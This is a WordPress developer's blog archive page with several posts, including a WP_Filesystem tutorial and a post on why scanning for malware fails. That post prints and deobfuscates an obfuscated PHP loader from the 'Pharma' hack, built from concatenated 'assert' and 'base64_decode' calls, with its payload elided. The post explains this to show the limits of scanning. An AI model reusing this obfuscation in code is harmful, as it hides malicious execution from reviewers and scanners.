<p>So, let&#8217;s run the gamut in this tutorial. Note that I wrote it quickly, so it may be uneven in parts. <img src="http://i2.wp.com/ottopress.com/wp-content/plugins/classic-smilies/img/icon_wink.gif?w=700" alt=";)" class="wp-smiley" data-recalc-dims="1" /> </p>
<h3>Why Not To Do It</h3>
<p>The most common reasons I see theme authors wanting to write local files falls into three categories:</p>
<ol>
<li>Dynamic CSS</li>
<li>Configuration Saving</li>
<li>Export/Import</li>
</ol>
<p>Take the Dynamic CSS case to start with, since it&#8217;s the most common one by far. Some theme authors say &#8220;I&#8217;m making a framework/system/construction-kit where the user can define their own theme/layout/color-schemes and thus produce a bunch of CSS. I want to save this CSS in the theme/uploads directory, and then put a link to it from their page, so that the browser downloads it from there.</p>
<p>Why they shouldn&#8217;t do that: There&#8217;s half a dozen reasons here, but the big two are a) put just the dynamic parts of CSS inline into the page instead, because it&#8217;s faster, simpler, and avoids an extra HTTP roundtrip for the user&#8217;s browser to get this CSS file and b) writing a CSS file locally is insecure as hell if you do it in the &#8220;natural&#8221; way.</p>
<p>Security is going to be a big issue for the next two items, so I&#8217;ll cover it right now.</p>
<p>Modern UNIX-like systems have the concept of &#8220;users&#8221;. When I SSH or FTP into my hosting account, then I&#8217;m logged in as me and my user account. However, my webserver doesn&#8217;t run as my user account. It runs under some different user account, usually &#8220;nobody&#8221; or &#8220;apache&#8221; or &#8220;web&#8221; or something similar to that.</p>
<p>So when I create files, they&#8217;re owned by me. When my webserver creates files, then they&#8217;re owned by the webserver&#8217;s user, whatever it is. Normally, this isn&#8217;t a big deal. The webserver can read and serve files either way, so who cares, right? Well, when you&#8217;re creating files that are owned by the webserver, then the webserver has permission to write to those files. It&#8217;s the owner of them, after all. What&#8217;s important here is that I&#8217;m not the only person on this webserver.</p>
<p>Shared hosting systems have many users files all served by the same webserver. So if I allow that &#8220;nobody&#8221; user to own files that are part of my webpage, then anybody else can use their account on the same webserver to modify those files, and thus modify my webpage. For the case of CSS files, this poses a cross-site-scripting risk. Somebody else on my shared webserver could insert code into my CSS files and change them so as to steal my account information. Bad mojo.</p>
<p>The other two, where theme authors are saving configuration or exporting and importing things have the same basic problems, although the risks might be even higher. In one case, I found a theme saving its configuration settings by creating a PHP file in the uploads directory and then using var_export to export the configuration variable to it. Then it proceeded to include this file when the theme loaded, to load its configuration back in. Talk about insecure, anybody running this theme is basically handing over the entire control of their website to <strong>anybody</strong> on the same web server.</p>
<h3>How To Do It Anyway</h3>
<p>&#8220;But Otto&#8221;, I hear you shouting from halfway around the world, &#8220;WordPress itself writes files all the time! It can even <em>upgrade itself</em>. How is this safe?&#8221; Well, Mr. Incredbly Loud Person, WordPress uses a system called WP_Filesystem to make this safe.</p>
<p>The WP_Filesystem basically support five different ways of writing files to the system and they all ensure that ownership of those files remains firmly in the hands of the same person that owns the WordPress files. In other words, it writes files using your user account and not as the webserver user.</p>
<p>I&#8217;m sure many people have seen this before:</p>
<p><a rel="attachment wp-att-472" href="http://ottopress.com/2011/tutorial-using-the-wp_filesystem/connectinfo/"><img class="alignnone size-full wp-image-472" title="connectinfo" src="http://i1.wp.com/ottopress.com/files/2011/04/connectinfo.png?resize=503%2C290" alt="" data-recalc-dims="1" /></a></p>
<p>This is the basic connection information screen that appears when you try to upgrade a plugin or themes or even the core code, on certain hosts. Some people may be running on hosts that don&#8217;t pop up this screen, but the basic process behind it still exists.</p>
<p>Essentially, what is going on here is that WordPress does some tests to detect how it can write files to the server and keep the same owner for those files. If it can&#8217;t do it directly, then it does it indirectly via FTP. It needs your login credentials at this point in order to log in as you and thus write files as you instead of as the webserver user that it&#8217;s running under.</p>
<h3>How to Implement the WP_Filesystem code</h3>
<p>Implementing the WP_Filesystem is easy, really. But to do it from a form or options type of system, then you need to have a form or options type of system already. So let&#8217;s start out with an extremely basic form, such as one a theme might implement.</p>
<p><a rel="attachment wp-att-473" href="http://ottopress.com/2011/tutorial-using-the-wp_filesystem/optionslink/"><img class="alignright size-full wp-image-473" title="optionslink" src="http://i1.wp.com/ottopress.com/files/2011/04/optionslink.png?resize=154%2C214" alt="" data-recalc-dims="1" /></a></p>
<pre class="brush: php; title: ; notranslate" title="">
// add the admin options page
add_action('admin_menu', 'otto_admin_add_page');

function otto_admin_add_page() {
	add_theme_page('Otto Test Page', 'Otto Test Options', 'edit_theme_options', 'otto', 'otto_options_page');
}
</pre>
<p>Okay, now we have a new options menu. Let&#8217;s make a form to put on that menu:</p>
<pre class="brush: php; title: ; notranslate" title="">
function otto_options_page() {
	if ( otto_check_buttons() ) return;
?&gt;
&lt;div&gt;
&lt;h2&gt;My custom options page&lt;/h2&gt;
&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
&lt;?php wp_nonce_field('otto-theme-options'); ?&gt;
&lt;input name=&quot;save&quot; type=&quot;submit&quot; value=&quot;Save a file&quot; /&gt;
&lt;/form&gt;&lt;/div&gt;
&lt;?php
}
</pre>
<p>Simple, no-nonsense form. It calls a function to check the incoming button press first (see more below), then it displays a form. It outputs a nonce, makes a button called &#8220;Save a file&#8221; since that&#8217;s what we&#8217;re going to do, then stops. Easy.</p>
<p>Note that the otto_check_buttons() function returns true or false, and this then returns when it is true, thus not displaying the form. This is simply to allow us to display the normal form or not, depending on what we need to do later.</p>
<p>So, when you submit the form, then that otto_check_buttons() function is going to come into effect. Let&#8217;s look at the beginning of that function:</p>
<pre class="brush: php; title: ; notranslate" title="">
function otto_check_buttons() {
	if (empty($_POST)) return false;

	check_admin_referer('otto-theme-options');
</pre>
<p>The beginning of it is simple. If the user hasn&#8217;t submitted the form yet, then it just returns false to make the previous function display the form. Next it checks the referer nonce, to make sure the nonce is correct for the page we&#8217;re on. Let&#8217;s continue:</p>
<pre class="brush: php; title: ; notranslate" title="">
$form_fields = array ('save'); // this is a list of the form field contents I want passed along between page views
$method = 'ftp'; // Normally you leave this an empty string and it figures it out by itself, but you can override the filesystem method here

// check to see if we are trying to save a file
if (isset($_POST['save'])) {
</pre>
<p>Here, I&#8217;m defining two variables that I&#8217;m going to use later. The form_fields is an array of the names of the fields in the form that I want to pass along through that connection information screen. In this case, I defined my &#8220;save&#8221; input field before, and it&#8217;s something I&#8217;ll be checking later, so it has to pass through that form. What happens is that the connection information form generates an extra hidden input with the contents from my first form.</p>
<p>The method variable is not strictly necessary. I&#8217;m forcing it to use the &#8220;ftp&#8221; method for this demonstration code. Normally, you leave this blank and the system figures it out for itself. Changing &#8216;ftp&#8217; to just &#8221; here works fine.</p>
<p>Finally, you can see where I&#8217;m checking to make sure the save button was clicked. Moving on:</p>
<pre class="brush: php; title: ; notranslate" title="">
// okay, let's see about getting credentials
$url = wp_nonce_url('themes.php?page=otto','otto-theme-options');
if (false === ($creds = request_filesystem_credentials($url, $method, false, false, $form_fields) ) ) {
	// if we get here, then we don't have credentials yet,
	// but have just produced a form for the user to fill in,
	// so stop processing for now
	return true; // stop the normal page form from displaying
}
</pre>
<p>Now is the part where I get the credentials from the user. The request_filesystem_credentials() does several things.</p>
<ul>
<li>It checks to see what kind of credentials it needs (we&#8217;re forcing it to FTP in this case)</li>
<li>It checks to see if they&#8217;re pre-DEFINEd in the wp-config file</li>
<li>It checks the POST input to see if it has just received them and returns them if it has</li>
<li>It checks the database to see if it remembers the hostname/username from before</li>
<li>It produces the necessary form to display if it doesn&#8217;t have them</li>
</ul>
<p>The bottom line being that if it has the necessary credentials, it will return them. Else, it will output the form to be displayed to get the credentials, and then return false. So when it returns false, we know the form has been displayed, so we just exit and wait for the user to give us the necessary credentials.</p>
<p>When we get those credentials, we have to check to make sure they work. Here&#8217;s how we do that:</p>
<pre class="brush: php; title: ; notranslate" title="">
// now we have some credentials, try to get the wp_filesystem running
if ( ! WP_Filesystem($creds) ) {
	// our credentials were no good, ask the user for them again
	request_filesystem_credentials($url, $method, true, false, $form_fields);
	return true;
}
</pre>
<p>Simple, really. We call the WP_Filesystem and see if the credentials work. If not, we call request_filesystem_credentials a second time, but this time with the $error flag set. This produces the error message and form to the user so he can correct the information.</p>
<p>Finally, we should have working credentials from the user and all the information we need, so we use the $wp_filesystem global to write out a file.</p>
<pre class="brush: php; title: ; notranslate" title="">
// get the upload directory and make a test.txt file
$upload_dir = wp_upload_dir();
$filename = trailingslashit($upload_dir['path']).'test.txt';

// by this point, the $wp_filesystem global should be working, so let's use it to create a file
global $wp_filesystem;
if ( ! $wp_filesystem-&gt;put_contents( $filename, 'Test file contents', FS_CHMOD_FILE) ) {
	echo 'error saving file!';
}
</pre>
<p>That&#8217;s really all there is to it. I made a file in the upload directory called &#8220;test.txt&#8221; and wrote &#8220;Test file contents&#8221; to it. The global $wp_filesystem variable is what our call to WP_Filesystem($creds) created. This $wp_filesystem supports various different file functions, but the put_contents() function is the easiest one to understand. I gave it the filename, some contents, and the correct permissions for a file on the system. Simple and easy.</p>
<h3>Reasons to use WP_Filesystem</h3>
<p>Two big ones:</p>
<ul>
<li>Compatibility</li>
<li>Security</li>
</ul>
<p>Because of the various permissions systems in use, the WP_Filesystem supports many different ways of writing files to the system, but all abstracted out into simpler functions like put_contents() and get_contents() and such.</p>
<p>The only downside to it is that sometimes you need to ask the user for their account information in order to be able to get the access you need. But this is necessary in order to be secure, since you don&#8217;t want everybody else on the same server to be able to write to your files. And while you may have a server all to yourself, most of your users won&#8217;t. The most common setup for WP is on shared hosting, and if you&#8217;re creating a theme or a plugin, you should design for those users as well.</p>
<p>A copy of all the code above made into a demo plugin can be found here: <a href="http://ottopress.com/files/2011/04/wpfilesystem-demo.phps">wpfilesystem-demo.phps</a>.</p>
				</div>

<div style="clear:both;"><span class="post-shortlink">Shortlink: 
<input type='text' value='http://otto42.com/96' onclick='this.focus(); this.select();' />
</span></div>

				<div class="postmetadata">
										Category: <a href="http://ottopress.com/category/code/" title="View all posts in Code" rel="category tag">Code</a>, <a href="http://ottopress.com/category/wordpress/" title="View all posts in WordPress" rel="category tag">WordPress</a>&nbsp;&nbsp;|&nbsp;
					<a href="http://ottopress.com/2011/tutorial-using-the-wp_filesystem/#comments" title="Comment on Tutorial: Using the WP_Filesystem">69 Comments</a>									 </div>
			</div>			<div id="post-446" class="post-446 post type-post status-publish format-standard hentry category-code category-wordpress tag-eval tag-evil tag-malware tag-pharma tag-securi tag-theme" itemprop="blogPosts" itemscope itemtype="http://schema.org/BlogPosting">
				<h2 class="posttitle"><a href="http://ottopress.com/2011/scanning-for-malicious-code-is-pointless/" rel="bookmark" title="Permanent Link to &#8220;Scanning&#8221; for Malicious Code is Pointless" itemprop="url"><span itemprop="name">&#8220;Scanning&#8221; for Malicious Code is Pointless</span></a></h2>
				<div class="postmetadata">March 8, 2011, 12:46 pm <!-- by <span rel="author">Samuel “Otto” Wood</span> --></div>
				<div class="postentry" itemprop="description">
					<p><img class="alignright size-thumbnail wp-image-447" title="Arms_Race" src="http://i2.wp.com/ottopress.com/files/2011/03/Arms_Race.jpg?resize=200%2C200" alt="" data-recalc-dims="1" />In the WordPress world, security is always a prime concern, and for obvious reasons. It&#8217;s a major target for spammers, what with 30 million sites and what have you. So there&#8217;s a lot of <a title="WordPress Extend - Search for &quot;Security&quot;" href="http://wordpress.org/extend/plugins/search.php?q=security">security plugins</a> to do scanning on your files, there&#8217;s <a title="WordPress File Monitor" href="http://wordpress.org/extend/plugins/wordpress-file-monitor/">file monitor plugins</a> which work by simply noticing changes to the files of any sort, we do scans in the theme check process, etc.</p>
<p>I&#8217;ve gotten a few responses back to some of my <a title="Anatomy of a Theme Malware" href="http://ottopress.com/2010/anatomy-of-a-theme-malware/">malware related posts</a> asking why WordPress doesn&#8217;t check for this sort of thing in the core code. Why can&#8217;t WordPress check for the existence of &#8220;eval&#8221; and such in a plugin before it runs it? Well, I&#8217;ll show you.</p>
<p><a href="http://blog.sucuri.net/2010/07/understanding-and-cleaning-the-pharma-hack-on-wordpress.html">Securi covered the &#8220;Pharma&#8221; attack</a> several months ago, but nobody seemed to notice the important bit of code that shows why WordPress can&#8217;t do scanning in core. Fact of the matter is that the hacks have already gone well beyond scanning for strings and such.</p>
<p>Take this code for example:</p>
<pre class="brush: php; title: ; notranslate" title="">
&lt;?php $XZKsyG='as';$RqoaUO='e';$ygDOEJ=$XZKsyG.'s'.$RqoaUO.'r'.'t';$joEDdb='b'.$XZKsyG.$RqoaUO.(64).'_'.'d'.$RqoaUO.'c'.'o'.'d'.$RqoaUO;@$ygDOEJ(@$joEDdb(long long string here)..
</pre>
<p>What does that do? Well, in short, that&#8217;s an eval(base64_decode()); Here it is again, broken down with newlines and such:</p>
<pre class="brush: php; title: ; notranslate" title="">
$XZKsyG='as';
$RqoaUO='e';
$ygDOEJ=$XZKsyG.'s'.$RqoaUO.'r'.'t';
$joEDdb='b'.$XZKsyG.$RqoaUO.(64).'_'.'d'.$RqoaUO.'c'.'o'.'d'.$RqoaUO;
@$ygDOEJ(@$joEDdb(long long string here)..
</pre>
<p>Those third and fourth lines are important, so lets fill in the two variables there with the &#8216;as&#8217; and &#8216;e&#8217; from above it:</p>
<pre class="brush: php; title: ; notranslate" title="">
$ygDOEJ='as'.'s'.'e'.'r'.'t';
$joEDdb='b'.'as'.'e'.(64).'_'.'d'.'e'.'c'.'o'.'d'.'e';
</pre>
<p>And we have &#8220;assert&#8221; and &#8220;base64_decode&#8221; once again. The <a title="PHP Manual for assert()" href="http://php.net/manual/en/function.assert.php">assert</a> function will also evaluate strings as PHP code, BTW. It&#8217;s really just an eval in another form.</p>
<p>The final line uses something about PHP that some people may not know. If I have a variable with a string in it, then I can call a function with that strings name by using the variable instead of the function name. In other words, this works:</p>
<pre class="brush: php; title: ; notranslate" title="">
function do_something() { }
$var = 'do_something';
$var();
</pre>
<p>Now tell me, how you gonna scan for something like that?</p>
<p>Determining whether a piece of code is malicious or not is basically equivalent to the <a title="Halting Problem on Wikipedia" href="http://en.wikipedia.org/wiki/Halting_problem">halting problem</a>. You can&#8217;t do it programmatically. Not really. If WP added code to the core to try to detect and stop this sort of thing, the spammers would simply modify their code so that the core couldn&#8217;t detect it anymore.</p>
<p>Why get into an arms race? It&#8217;s better to concentrate on making WordPress itself secure and to try to educate both users and hosts about good security practices. Most hacked sites get hacked via insecure server configurations, not through WordPress itself.</p>
<p>So scanning is pointless. So why do we still do it for <a title="Theme Check" href="http://wordpress.org/extend/plugins/theme-check/">theme check</a> and such? Because not all malicious code is as cleverly written, and so some basic scanning is indeed somewhat effective. And the goal there is simply to weed out the problems. All of the WordPress.org theme checking is done by human eyeballs, the scanning tools just ensure a minimal level of theme capabilities and make pruning that much quicker.</p>
				</div>

<div style="clear:both;"><span class="post-shortlink">Shortlink: 
<input type='text' value='http://otto42.com/92' onclick='this.focus(); this.select();' />
</span></div>

				<div class="postmetadata">
					Tags: <a href="http://ottopress.com/tag/eval/" rel="tag">eval</a>, <a href="http://ottopress.com/tag/evil/" rel="tag">evil</a>, <a href="http://ottopress.com/tag/malware/" rel="tag">malware</a>, <a href="http://ottopress.com/tag/pharma/" rel="tag">pharma</a>, <a href="http://ottopress.com/tag/securi/" rel="tag">securi</a>, <a href="http://ottopress.com/tag/theme/" rel="tag">theme</a><br />					Category: <a href="http://ottopress.com/category/code/" title="View all posts in Code" rel="category tag">Code</a>, <a href="http://ottopress.com/category/wordpress/" title="View all posts in WordPress" rel="category tag">WordPress</a>&nbsp;&nbsp;|&nbsp;
					<a href="http://ottopress.com/2011/scanning-for-malicious-code-is-pointless/#comments" title="Comment on &#8220;Scanning&#8221; for Malicious Code is Pointless">15 Comments</a>									 </div>
			</div>			<div id="post-416" class="post-416 post type-post status-publish format-standard hentry category-code tag-plugin tag-twitter tag-wordpress-2 tag-yourls" itemprop="blogPosts" itemscope itemtype="http://schema.org/BlogPosting">
				<h2 class="posttitle"><a href="http://ottopress.com/2011/modified-yourls-plugin/" rel="bookmark" title="Permanent Link to Modified YOURLS Plugin" itemprop="url"><span itemprop="name">Modified YOURLS Plugin</span></a></h2>
				<div class="postmetadata">February 2, 2011, 2:06 pm <!-- by <span rel="author">Samuel “Otto” Wood</span> --></div>
				<div class="postentry" itemprop="description">
					<p>I got tired of waiting for a &#8220;proper&#8221; YOURLS WordPress plugin to come out, so I did it myself. Hey, I&#8217;ve got other stuff to do, and I needed a working shortlink solution.</p>
<p>Basically, this is the &#8220;<a href="http://wordpress.org/extend/plugins/yourls-wordpress-to-twitter/">YOURLS: WordPress to Twitter</a>&#8221; plugin, with all the Twitter bits removed.</p>
<p>While I was in there, I also fixed the password saving bug that I kept having in Chrome (just cut out the submit button JS), switched it to eliminate the Pear_JSON package entirely (WordPress has JSON support built in already), and did some other minor things. I&#8217;m sure I missed some bits, but for the most part it was really just a hack and slash job. Eliminated about 30% of the plugin&#8217;s main code and all the ancillary Twitter libraries.</p>
<p>On a side note, this sort of thing only reinforces something I&#8217;ve said before: Plugins should only try to do <strong>one</strong> thing, and to do it well. Trying to have a twitter solution in this plugin when I didn&#8217;t want to use that bit at all basically just made it stop doing the shortlinks correctly. That&#8217;s a real problem when it&#8217;s really a shortlink plugin to begin with. I already had a really good twitter solution, trying to have all this extra crap in there just made it not work properly.</p>
<p>If I had more time, I&#8217;d also remove all the JS stuff on the settings page too. That&#8217;s not really necessary when you only have a few fields to enter. But I guess it works, sort of. Whatever. Not important.</p>
<p>Anyway, here you go. I won&#8217;t be putting this in the plugins repository, since it&#8217;s not really my code. But I am posting it here in case it helps anybody. And if Ozh changes his plugin to eliminate the Twitter stuff (or to at least make it optional without impacting functionality), then it would be worth switching to that in the future. I won&#8217;t be supporting this plugin anytime soon.</p>
<p><a href='http://ottopress.com/files/2011/02/yourls-wordpress.zip'><img src="http://i0.wp.com/ottopress.com/files/2010/03/nav-get.png?resize=48%2C48" alt="" title="nav-get" class="size-full wp-image-9" data-recalc-dims="1" />YOURLS &#8211; WordPress (no Twitter)</a></p>
<p>Edit: Note that I did this mainly because I wanted to use my own Simple Twitter Connect instead for posting items to Twitter. That works fine and uses the shortlink from this plugin fine. But the extra Twitter stuff in the original plugin interfered with it, and there was no good way to disable that stuff short of editing the plugin. I&#8217;m a fan of not editing other people&#8217;s plugins, but in this case there really wasn&#8217;t a lot of choice. YOURLS is a good system and I like using it, I just wish the WP plugin for it wasn&#8217;t trying to do so much. Just so you know. <img src="http://i1.wp.com/ottopress.com/wp-content/plugins/classic-smilies/img/icon_smile.gif?w=700" alt=":)" class="wp-smiley" data-recalc-dims="1" /> </p>
				</div>

<div style="clear:both;"><span class="post-shortlink">Shortlink: 
<input type='text' value='http://otto42.com/8y' onclick='this.focus(); this.select();' />
</span></div>

				<div class="postmetadata">
					Tags: <a href="http://ottopress.com/tag/plugin/" rel="tag">plugin</a>, <a href="http://ottopress.com/tag/twitter/" rel="tag">twitter</a>, <a href="http://ottopress.com/tag/wordpress-2/" rel="tag">WordPress</a>, <a href="http://ottopress.com/tag/yourls/" rel="tag">yourls</a><br />					Category: <a href="http://ottopress.com/category/code/" title="View all posts in Code" rel="category tag">Code</a>&nbsp;&nbsp;|&nbsp;
					<a href="http://ottopress.com/2011/modified-yourls-plugin/#comments" title="Comment on Modified YOURLS Plugin">33 Comments</a>									 </div>
			</div>			<div id="post-397" class="post-397 post type-post status-publish format-standard hentry category-code category-wordpress tag-chrome tag-html tag-html5 tag-php tag-search tag-searchform tag-theme tag-voice tag-wordpress-2" itemprop="blogPosts" itemscope itemtype="http://schema.org/BlogPosting">
				<h2 class="posttitle"><a href="http://ottopress.com/2011/wp-quickie-adding-chrome-voice-search/" rel="bookmark" title="Permanent Link to WP Quickie: Adding Chrome Voice Search" itemprop="url"><span itemprop="name">WP Quickie: Adding Chrome Voice Search</span></a></h2>
				<div class="postmetadata">January 5, 2011, 11:35 pm <!-- by <span rel="author">Samuel “Otto” Wood</span> --></div>
				<div class="postentry" itemprop="description">
					<p>Saw <a href="http://googlesystem.blogspot.com/2011/01/voice-search-for-google-chrome.html">this post</a> about Chrome voice searching in HTML forms on Google&#8217;s blog today. Very cool, so I had to give it a try. If you check the &#8220;Search&#8221; box in the upper right corner of the page, you&#8217;ll see a little icon (if you&#8217;re using a dev version of Chrome). Click it to do a search-by-voice.</p>
<p>What I didn&#8217;t expect was how totally easy it is to implement. Seriously, it&#8217;s less than a line of code.</p>
<p><img src="http://i2.wp.com/ottopress.com/files/2011/01/voicesearch.png?resize=292%2C189" alt="" title="Voice Searching" class="size-full wp-image-400" data-recalc-dims="1" /></p>
<p>Example. Say your search box (possibly in your theme&#8217;s searchform.php file) looks like this:</p>
<pre class="brush: php; title: ; notranslate" title="">
&lt;form id=&quot;searchform&quot; action=&quot;&lt;?php bloginfo('home'); ?&gt;/&quot; method=&quot;get&quot;&gt;
&lt;input id=&quot;s&quot; name=&quot;s&quot; size=&quot;20&quot; type=&quot;text&quot; value=&quot;&lt;?php _e('Search') ?&gt;...&quot; /&gt;
&lt;/form&gt;
</pre>
<p>All you have to do is to add some bits to the input element box. Specifically, you add <em>x-webkit-speech speech onwebkitspeechchange=&#8221;this.form.submit();&#8221;</em>. That&#8217;s it. Seriously:</p>
<pre class="brush: php; title: ; notranslate" title="">
&lt;form id=&quot;searchform&quot; action=&quot;&lt;?php bloginfo('home'); ?&gt;/&quot; method=&quot;get&quot;&gt;
&lt;input id=&quot;s&quot; name=&quot;s&quot; size=&quot;20&quot; type=&quot;text&quot; value=&quot;&lt;?php _e('Search') ?&gt;...&quot; x-webkit-speech speech onwebkitspeechchange=&quot;this.form.submit();&quot; /&gt;
&lt;/form&gt;
</pre>
<p>Note that this won&#8217;t validate, if you care about that sort of thing. Works fine though.</p>
<p>You can do <a href="http://www.w3.org/2005/Incubator/htmlspeech/2010/10/google-api-draft.html">a whole lot more</a> with Javascript and events and translations and multiple choices and such, if you&#8217;re thinking of developing something cool with it. I&#8217;m just shocked and amazed that this is already in my browser and I had no idea it was there. Very cool.</p>
				</div>

<div style="clear:both;"><span class="post-shortlink">Shortlink: 
<input type='text' value='http://otto42.com/8w' onclick='this.focus(); this.select();' />
</span></div>

				<div class="postmetadata">
					Tags: <a href="http://ottopress.com/tag/chrome/" rel="tag">chrome</a>, <a href="http://ottopress.com/tag/html/" rel="tag">html</a>, <a href="http://ottopress.com/tag/html5/" rel="tag">html5</a>, <a href="http://ottopress.com/tag/php/" rel="tag">PHP</a>, <a href="http://ottopress.com/tag/search/" rel="tag">search</a>, <a href="http://ottopress.com/tag/searchform/" rel="tag">searchform</a>, <a href="http://ottopress.com/tag/theme/" rel="tag">theme</a>, <a href="http://ottopress.com/tag/voice/" rel="tag">voice</a>, <a href="http://ottopress.com/tag/wordpress-2/" rel="tag">WordPress</a><br />					Category: <a href="http://ottopress.com/category/code/" title="View all posts in Code" rel="category tag">Code</a>, <a href="http://ottopress.com/category/wordpress/" title="View all posts in WordPress" rel="category tag">WordPress</a>&nbsp;&nbsp;|&nbsp;
					<a href="http://ottopress.com/2011/wp-quickie-adding-chrome-voice-search/#comments" title="Comment on WP Quickie: Adding Chrome Voice Search">17 Comments</a>									 </div>
			</div>			<div id="post-389" class="post-389 post type-post status-publish format-standard hentry category-code tag-connect tag-facebook tag-plugin tag-sfc tag-simple tag-update" itemprop="blogPosts" itemscope itemtype="http://schema.org/BlogPosting">
				<h2 class="posttitle"><a href="http://ottopress.com/2010/sfc-updates/" rel="bookmark" title="Permanent Link to SFC Updates" itemprop="url"><span itemprop="name">SFC Updates</span></a></h2>
				<div class="postmetadata">December 28, 2010, 2:50 pm <!-- by <span rel="author">Samuel “Otto” Wood</span> --></div>
				<div class="postentry" itemprop="description">
					<p><img src="http://i1.wp.com/ottopress.com/files/2010/08/facebook-logo.png?resize=200%2C200" alt="" title="facebook-logo" class="alignright size-thumbnail wp-image-240" data-recalc-dims="1" />Sorry for the several updates over the last day. Somebody pointed out that I hadn&#8217;t pushed a new version of SFC in several months, and that the fixes in trunk had gotten a ways ahead of those in the released version. Unfortunately, I didn&#8217;t actually go and test properly, so versions 0.22 and 0.23 had minor but critical bugs in them. Version 0.24 should push shortly with the fixes for those bugs as well as the enhancements over the last several months.</p>
<p>A short list of the changes/fixes:</p>
<ul>
<li>Thanks to Burak Tuyan, the whole plugin is now more i18n capable, for people who want to translate it.</li>
<li>Added an sfc_img_exclude filter, to let others add their own image classes to exclude from the automatic image finder for share and publish and such.</li>
<li>The sfc_like_button() functions now supports a url parameter to add a like button to a specific URL.</li>
<li>A couple of patches by <a href="http://jwz.org">Jamie Zawinski</a>: Publish now sends up to 1000 chars from the post to Facebook.</li>
<li>Also thanks to jwz, publish now gets images correctly in more cases.</li>
<li>If you enable login avatars (by uncommenting that code), it will show them for comments now too.</li>
<li>Eliminated deprecated calls to Facebook functions (xid and register users calls)</li>
<li>Custom Post Type support for automatic publishing (any CPT with public=&gt;true will get auto-published).</li>
<li>Custom Post Type support for manual publishing (any CPT with public=&gt;true will show the meta box in its edit screen).</li>
<li>Contextual help added to SFC Settings page.</li>
<li>Improved error messages</li>
<li>Numerous other minor optimizations and bugfixes</li>
</ul>
<p>Version 1.0, which will ditch the old Connect code entirely, isn&#8217;t quite ready yet. The new <a href="http://developers.facebook.com/blog/post/440">registration stuff</a> will be in there though, eventually. It will probably be after I get back from the <a href="http://wordpress.org/news/2010/12/coming-up-meet-the-makers/">core developers meeting</a> though. Sorry for the excessive delay on that. I know lots of people want it, I never seem to have the time. I&#8217;ll try to find the time and finish it up soon. Really.</p>
<p><strong>Note to users</strong>: If you got the &#8220;Breaking change: API deprecations&#8221; email from Facebook today, then you are probably using the SFC-Login plugin, or have at some point. Version 0.24 removes the code they are deprecating from the SFC-Login plugin. So upgrade and you&#8217;ll be fine. However, note that SFC is no longer compatible with WordPress versions prior to 3.0. Upgrade WordPress to 3.0 or later before upgrading SFC.</p>
<p><strong>Note to international users</strong>: And with all that, there&#8217;s still a bug. If you&#8217;re seeing weird characters in your FB Published posts, edit the sfc-publish.php file. On line 179 you&#8217;ll find <code>return utf8_encode($text);</code>. Change it to <code>return $text;</code> to fix the problem with the double encoded characters. The next version will have this fix as well, but I didn&#8217;t think it was major enough to push a whole new version right away.</p>
				</div>

<div style="clear:both;"><span class="post-shortlink">Shortlink: 
<input type='text' value='http://otto42.com/8v' onclick='this.focus(); this.select();' />
</span></div>

				<div class="postmetadata">
					Tags: <a href="http://ottopress.com/tag/connect/" rel="tag">connect</a>, <a href="http://ottopress.com/tag/facebook/" rel="tag">facebook</a>, <a href="http://ottopress.com/tag/plugin/" rel="tag">plugin</a>, <a href="http://ottopress.com/tag/sfc/" rel="tag">sfc</a>, <a href="http://ottopress.com/tag/simple/" rel="tag">simple</a>, <a href="http://ottopress.com/tag/update/" rel="tag">update</a><br />					Category: <a href="http://ottopress.com/category/code/" title="View all posts in Code" rel="category tag">Code</a>&nbsp;&nbsp;|&nbsp;
					<a href="http://ottopress.com/2010/sfc-updates/#comments" title="Comment on SFC Updates">55 Comments</a>									 </div>
			</div>
		<div class="navigation">
			<div class="alignleft"><a href="http://ottopress.com/category/code/page/6/" >&laquo; Previous Entries</a></div>
			<div class="alignright"><a href="http://ottopress.com/category/code/page/4/" >Next Entries &raquo;</a></div>
		</div>
		
	
	</div>
	<div id="sidebar">
		<ul>
			
			<li id="paypal-donate" class="widget widget_wpaypal"><h2 class="widgettitle">Buy Otto a Beer</h2>
<div style="margin-top:5px;margin-bottom:5px;text-align:left;">
		<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
		<p><input type="hidden" name="cmd" value="_xclick" />
		<input type="hidden" name="business" value="otto@ottodestruct.com" />
		<input type="hidden" name="item_name" value="Donation to Otto on WordPress" />
		<input type="hidden" name="item_number" value="0" />
		<input type="hidden" name="notify_url" value="" />
		<input type="hidden" name="no_shipping" value="1" /><input type="hidden" name="return" value="http://ottopress.com" />
		<input type="hidden" name="no_note" value="1" />
		<input type="hidden" name="tax" value="0" />
		<input type="hidden" name="bn" value="PP-DonationsBF" />
		<input type="hidden" name="on0" value="Website" />
		Currency: <br />
		<select id="currency_code" name="currency_code">
		<option value="USD">U.S. Dollars</option>
		<option value="AUD">Australian Dollars</option>
		<option value="CAD">Canadian Dollars</option>
		<option value="EUR">Euros</option>
		<option value="GBP">Pounds Sterling</option>
		<option value="JPY">Yen</option></select></p>
		<p>Amount: <br /><input type="text" name="amount" size="16" title="The amount you wish to donate" value="5.00" /></p>
		<p>Website(Optional): <br /><input type="text" size="16" title="Your website (will be displayed)" name="os0" value="" /></p><p><input class="ppimg" type="image" src="https://www.paypal.com/en_US/i/btn/x-click-but21.gif" name="submit" style="border:0;" alt="Make payments with PayPal - fast, free and secure" /></p></form></div></li>
<li id="text-7" class="widget widget_text">			<div class="textwidget">Hey, I also take Bitcoins! Send them to: </br>
<a href="bitcoin:1ottoqnFyTtaB6GiJZxMQ79rsSqBL2ZBg">
<img src="https://chart.googleapis.com/chart?chs=150x150&cht=qr&chl=bitcoin:1ottoqnFyTtaB6GiJZxMQ79rsSqBL2ZBg" /><br />
1ottoqnFyTtaB6GiJZxMQ79rsSqBL2ZBg</a></div>
		</li>
<li id="text-5" class="widget widget_text"><h2 class="widgettitle">Subscribe!</h2>
			<div class="textwidget"><!-- <a href="https://plus.google.com/111166992820603637934?prsrc=3" style="cursor:pointer;display:inline-block;text-decoration:none;color:#333;font:13px/16px arial,sans-serif;"><span style="display:inline-block;font-weight:bold;vertical-align:top;margin-right:5px;margin-top:8px;">Otto on WordPress</span><span style="display:inline-block;vertical-align:top;margin-right:15px;margin-top:8px;">on</span><img src="https://ssl.gstatic.com/images/icons/gplus-32.png" alt="" style="border:0;width:32px;height:32px;"/></a>
-->
<div class="g-plus" data-href="https://plus.google.com/111166992820603637934?rel=publisher" data-width="250" data-height="131" data-theme="light"></div>
</div>
		</li>
